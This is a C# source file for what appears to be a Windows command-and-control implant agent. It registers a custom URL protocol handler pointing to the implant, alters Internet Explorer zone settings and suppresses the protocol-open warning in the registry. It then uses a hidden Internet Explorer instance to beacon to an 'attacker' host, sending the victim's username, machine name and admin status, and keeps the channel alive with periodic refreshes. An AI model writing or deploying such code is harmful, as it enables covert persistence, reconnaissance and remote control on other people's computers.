using SHDocVw;
using System;
using System.Linq;
using System.Threading;
using System.Security.Principal;
using Microsoft.Win32;

namespace CSharpAgent
{ 
    class Agent
    {
        public static int keepalivesec = 5000;
        public static string victimId = genVictimId(8);
        public static string attackerip = "127.0.0.1";
        public static string attackerport = "80";
        public static string protocolname = "windows";
        public static string initiateUri = "http://" + attackerip + ":" + attackerport + "/initiate?victim=" + victimId;
        public static string keepaliveUri = "http://" + attackerip + ":" + attackerport + "/keepalive?victim=" + victimId;
        public static string outputUri = "http://" + attackerip + ":" + attackerport + "/output";
        public static InternetExplorer ie = new InternetExplorer();

        // Edit agent path for local or remote implant location
        //public static string agentpath = "\"\\\\" + attackerip + "\\window\\lsass.exe\" \"%1\"";
        public static string agentpath = "\"C:\\Users\\sdavis\\Documents\\GitHub\\LogPincher\\VSProj\\LogPincher\\CSharpImplant\\CSharpImplant\\bin\\Debug\\CSharpImplant.exe\" \"%1\"";
        

        static void Main(string[] args)
        {
            changeKeys();
            ie.Visible = false;
            initiateConnection(ie);
            keepAlive(ie);
        }


        public static bool checkAdmin()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }


        public static string genVictimId(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            var random = new Random();
            return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
        }


        static void changeKeys()
        {
            Registry.CurrentUser.CreateSubKey("Software\\Classes\\windows\\shell\\open\\command");
            Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Internet Explorer\\ProtocolExecute\\windows");

            RegistryKey first = Registry.CurrentUser.OpenSubKey("Software\\Classes\\windows", true);
            first.SetValue("", "URL:windows");
            first.SetValue("URL Protocol", victimId);
            first.Close();

            RegistryKey second = Registry.CurrentUser.OpenSubKey("Software\\Classes\\windows\\shell\\open\\command", true);
            second.SetValue("", agentpath);
            second.Close();

            RegistryKey third = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3", true);
            third.SetValue("2500", 3, RegistryValueKind.DWord);
            third.Close();

            RegistryKey fourth = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\ProtocolExecute\\windows", true);
            fourth.SetValue("WarnOnOpen", 0, RegistryValueKind.DWord);
            fourth.Close();
        }


        static void keepAlive(InternetExplorer ie)
        {
            Thread.Sleep(keepalivesec);
            ie.Refresh2(3);
            keepAlive(ie);
        }


        static void initiateConnection(InternetExplorer ie)
        {
            string hostname;
            string output;
            string username = (Environment.UserDomainName) + "\\" + (Environment.UserName);

            if (Environment.UserDomainName == Environment.MachineName)
            {
                hostname = "WORKGROUP\\" + Environment.MachineName;
            }
            else
            {
                hostname = (Environment.UserDomainName) + "\\" + (Environment.MachineName);
            }

            // Check High Integrity
            if (checkAdmin() == true)
            {
                output = "&username=**" + username + "&computer=" + hostname;
            }
            else
            {
                output = "&username=" + username + "&computer=" + hostname;
            }

            ie.Silent = false;
            ie.Navigate(initiateUri + output);
            while (ie.Busy) { Thread.Sleep(1000); }
            ie.Navigate(keepaliveUri);
        }
    }
}